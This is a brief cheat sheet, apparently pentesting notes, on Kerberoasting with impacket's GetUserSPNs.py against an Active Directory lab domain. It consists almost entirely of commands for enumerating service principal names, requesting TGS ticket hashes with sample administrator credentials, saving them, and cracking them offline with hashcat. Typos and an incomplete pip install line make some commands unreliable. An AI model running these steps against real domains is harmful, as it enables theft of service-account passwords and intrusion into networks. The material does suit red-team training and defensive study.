``GetUserSPNs.py`` is a script from impacket toolkit that is used to enumerate **Service Principal Names(SPNs)** from an Active Directory enviornment. It is commonly used in **Kerberoasting attacks** to request and extracrt kerberos service ticket hashes(TGS) for offline cracking

---

### Installation

if impacket is not already installed

```bash
git clone https://github.com/fortra/impacket.git
```

```bash
cd impacket
```

```bash
python3 -m pip install
```

---

### Basic Usage Without Authentication

Enumerate SPNs anonymously (if allowed)

```bash
python3 GetUserSPNs.py infosecwarrior.local/ -dc-ip <IP>
```

---

### Authenticated SPN Enumeration

Authenticate as domain user to get SPNs with RC4 hashes.

```bash
python3 GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP>
```

---

### Use a Custom User List

```bash
python3 GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP> -usersfile username.txt 
```

---

### Request Service Tickets

add the ``-request`` flag to request TGS tickets for crackable hashes

```bash
pyhton3 GetUserSPNs.py infosecwarrior.local/ -dc-ip <IP> -request
```

with credentials

```bash
python3 GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP> -request
```

---

### Use with User File + Request Hashes

```bash
python3 GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP> -usersfile username.txt -request
```

---

### Output hashes to File


```bash
python3 GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP> -request -outputfile kerberoasting-hash.txt
```

---

### Crack Hashes woth hashcat

use hashmode ``13100`` for kerberos 5 TGS-REP etype 23 hashes

```bash
hashcat -a 0 -m 13100 kerberoasting-hash.txt /opt/rockyou.txt 
```

---

### Notes

* Only accounts with SPNs and RC4_HMAC (etype 23) can be roasted.
* TGS hashes are crackable offlie and may revel plaintext passwords of service accounts
* SPNs typically follow formats like
  * HTTP/servername.domain.local
  * MSSQLSvc/servername:1433